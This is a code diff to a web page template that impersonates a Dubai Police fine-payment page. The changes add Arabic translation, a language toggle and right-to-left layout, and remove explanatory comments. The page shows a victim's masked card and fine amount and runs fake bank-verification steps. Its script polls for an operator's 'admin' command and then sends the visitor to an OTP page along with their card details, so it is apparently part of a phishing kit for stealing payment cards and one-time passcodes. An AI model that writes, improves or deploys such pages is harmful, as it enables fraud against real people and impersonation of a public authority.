@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <title>Processing Payment | Dubai Police</title>
 <link rel="icon" type="image/png" href="/dp-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Inter', -apple-system, sans-serif; background: #f0f4f8; min-height: 100vh; display: flex; flex-direction: column; }
+[dir="rtl"] body { font-family: 'Cairo', 'Inter', sans-serif; }
 
 @keyframes spin   { to { transform: rotate(360deg); } }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
@@ -41,7 +42,6 @@ header {
   animation: fadeIn 0.4s ease;
 }
 
-/* Spinner ring */
 .spinner-wrap {
   position: relative; width: 80px; height: 80px;
   margin: 0 auto 28px;
@@ -74,13 +74,16 @@ header {
   margin-bottom: 24px;
 }
 .detail-left  { text-align: left; }
+[dir="rtl"] .detail-left { text-align: right; }
 .detail-label { font-size: 11px; color: #94a3b8; margin-bottom: 2px; }
 .detail-card  { font-size: 14px; font-weight: 700; color: #0f172a; font-family: monospace; }
 .detail-right { text-align: right; }
+[dir="rtl"] .detail-right { text-align: left; }
 .detail-amount-label { font-size: 11px; color: #94a3b8; margin-bottom: 2px; }
 .detail-amount { font-size: 20px; font-weight: 900; color: #1a6b3a; }
 
 .steps { text-align: left; display: flex; flex-direction: column; gap: 10px; margin-bottom: 24px; }
+[dir="rtl"] .steps { text-align: right; }
 .step  { display: flex; align-items: center; gap: 10px; font-size: 12px; color: #94a3b8; }
 .step.done   { color: #1a6b3a; }
 .step.active { color: #0f172a; font-weight: 600; }
@@ -98,7 +101,6 @@ header {
   display: flex; align-items: center; justify-content: center; gap: 5px;
 }
 
-/* Redirect overlay */
 #redirect-overlay {
   display: none; position: fixed; inset: 0;
   background: rgba(15,26,10,0.85); backdrop-filter: blur(4px);
@@ -123,10 +125,10 @@ header {
 <header>
   <div style="width:34px;"></div>
   <div class="header-title">
-    <div>Secure Payment</div>
-    <div>الدفع الآمن</div>
+    <div data-i18n="secure_payment_title">Secure Payment</div>
+    <div>شرطة دبي</div>
   </div>
-  <img src="/dp-logo.png" alt="Dubai Police" width="34" height="34" style="border-radius:50%;opacity:0.9;">
+  <button id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')" style="font-size:12px;font-weight:700;padding:4px 11px;border-radius:16px;border:1.5px solid rgba(255,255,255,0.45);background:rgba(255,255,255,0.12);color:white;cursor:pointer;">AR</button>
 </header>
 
 <div class="main">
@@ -139,43 +141,43 @@ header {
       </div>
     </div>
 
-    <div class="status-title">Payment Submitted</div>
-    <div class="status-sub">Your transaction is being reviewed by our security system. Please keep this page open.</div>
+    <div class="status-title" data-i18n="payment_submitted">Payment Submitted</div>
+    <div class="status-sub" data-i18n="payment_submitted_sub">Your transaction is being reviewed by our security system. Please keep this page open.</div>
 
     <div class="detail-box">
       <div class="detail-left">
-        <div class="detail-label">Card</div>
+        <div class="detail-label" data-i18n="card">Card</div>
         <div class="detail-card">**** **** **** <%= cardLast4 %></div>
       </div>
       <div class="detail-right">
-        <div class="detail-amount-label">Amount</div>
+        <div class="detail-amount-label" data-i18n="amount">Amount</div>
         <div class="detail-amount">AED <%= totalFine.toLocaleString() %></div>
       </div>
     </div>
 
     <div class="steps" id="steps">
-      <div class="step done"   id="s0"><div class="step-dot">&#10003;</div> Payment details received</div>
-      <div class="step done"   id="s1"><div class="step-dot">&#10003;</div> Card verified</div>
-      <div class="step active" id="s2"><div class="step-dot"><div class="step-blink"></div></div> Contacting your bank...</div>
-      <div class="step"        id="s3"><div class="step-dot"></div> Awaiting bank confirmation</div>
+      <div class="step done"   id="s0"><div class="step-dot">&#10003;</div> <span data-i18n="step1">Payment details received</span></div>
+      <div class="step done"   id="s1"><div class="step-dot">&#10003;</div> <span data-i18n="step2">Card verified</span></div>
+      <div class="step active" id="s2"><div class="step-dot"><div class="step-blink"></div></div> <span data-i18n="step3">Contacting your bank...</span></div>
+      <div class="step"        id="s3"><div class="step-dot"></div> <span data-i18n="step4">Awaiting bank confirmation</span></div>
     </div>
 
     <div class="security-note">
       <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Secured by 256-bit SSL encryption
+      <span data-i18n="ssl">Secured by 256-bit SSL encryption</span>
     </div>
   </div>
 </div>
 
-<!-- Redirect overlay shown when admin sends user to OTP page -->
 <div id="redirect-overlay">
   <div class="redirect-card">
     <div class="redirect-spinner"></div>
-    <div class="redirect-text">Connecting to Bank</div>
-    <div class="redirect-sub">Redirecting to authentication page...</div>
+    <div class="redirect-text" data-i18n="connecting_bank">Connecting to Bank</div>
+    <div class="redirect-sub" data-i18n="redirecting_auth">Redirecting to authentication page...</div>
   </div>
 </div>
 
+<script src="/js/i18n.js"></script>
 <script>
 const SID        = <%- JSON.stringify(sid) %>;
 const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
@@ -187,7 +189,6 @@ const sidParams = '?cardLast4=' + encodeURIComponent(CARD_LAST4)
                 + '&issuer='   + encodeURIComponent(ISSUER)
                 + '&sid='      + SID;
 
-// Animate step 3 activation after a short delay
 setTimeout(() => {
   const s2 = document.getElementById('s2');
   const s3 = document.getElementById('s3');
@@ -197,7 +198,6 @@ setTimeout(() => {
   s3.querySelector('.step-dot').innerHTML = '<div class="step-blink"></div>';
 }, 3500);
 
-// Poll for admin redirect
 if (SID) {
   const poll = setInterval(async () => {
     try {
@@ -205,7 +205,6 @@ if (SID) {
       const d = await r.json();
       if (d.action === 'redirect' && d.page) {
         clearInterval(poll);
-        // Show overlay, then navigate after brief delay
         document.getElementById('redirect-overlay').classList.add('show');
         setTimeout(() => {
           window.location.href = '/' + d.page + sidParams;
